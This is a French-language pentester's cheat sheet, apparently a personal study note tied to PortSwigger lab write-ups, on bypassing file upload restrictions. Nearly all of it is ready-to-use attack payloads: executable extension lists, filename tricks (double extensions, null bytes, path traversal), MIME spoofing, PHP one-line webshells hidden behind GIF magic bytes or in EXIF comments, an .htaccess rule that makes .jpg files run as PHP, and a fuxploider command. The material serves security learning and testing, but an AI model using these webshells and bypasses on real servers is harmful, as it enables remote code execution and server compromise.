---
titre: "File Upload — 3 - Payloads & bypass"
tags: [Failles, file-upload, payloads, bypass, cheatsheet]
---

# File Upload — 3. Payloads & bypass

> ⬅ [[File Upload - Index]]

## Extensions alternatives (blacklist d'extensions)
```
PHP   : .phtml .php3 .php4 .php5 .php7 .phar .pht .pgif .phtm .inc
ASP   : .asp .aspx .cer .asa .cshtml
JSP   : .jsp .jspx .jsw .jsv .jspf
autres: .svg (XSS/XXE) .html .xml .htaccess (réactiver l'exécution)
```

## Manipulations du nom de fichier
```
shell.php                       shell.pHp          (casse)
shell.php.jpg                    shell.jpg.php      (double extension)
shell.php%00.jpg                 shell.php\x00.jpg  (null byte, vieux stacks)
shell.php;.jpg                   shell.php%20       shell.php.      (trailing)
shell.php................jpg     (padding de points)
shell.asp;.jpg                   (IIS legacy)
../../shell.php                  (path traversal à l'upload)
```

## Content-Type (header MIME)
```
Content-Type: image/jpeg    (mais corps = code PHP)
Content-Type: image/png     Content-Type: image/gif
```

## Contenu / magic bytes (validation du "vrai" type)
```
# préfixer le webshell par une signature d'image
GIF89a;<?php system($_GET['cmd']); ?>
# ou uploader une vraie image + code PHP en commentaire EXIF
exiftool -Comment='<?php system($_GET[cmd]); ?>' image.jpg    (puis renommer .php)
# PNG/JPEG polyglot (cf. mes write-ups PortSwigger : Polyglot, Type MIME)
```
> Voir aussi mes write-ups appliqués : `CTF/PortSwigger/File Upload/`
> ([[Polyglot]], [[Type MIME]], [[ZIP]]).

## `.htaccess` (réactiver l'exécution d'une extension inoffensive)
Si on peut uploader un `.htaccess` :
```apache
AddType application/x-httpd-php .jpg
```
→ les `.jpg` uploadés sont désormais exécutés comme du PHP.

## Bypass de validation côté client
Uploader un fichier autorisé puis **renommer en `.php` dans Burp/Caido** avant
l'envoi (le JS ne re-vérifie pas côté serveur).

## Outils
```bash
# fuzzer extensions/types automatiquement
# (Burp Intruder sur l'extension, ou upload-scanner / fuxploider)
python3 fuxploider.py -u http://CIBLE/upload
```
> Détection : [[1 - Repérage (File Upload)]] · techniques : [[2 - Exploitation & techniques (File Upload)]].
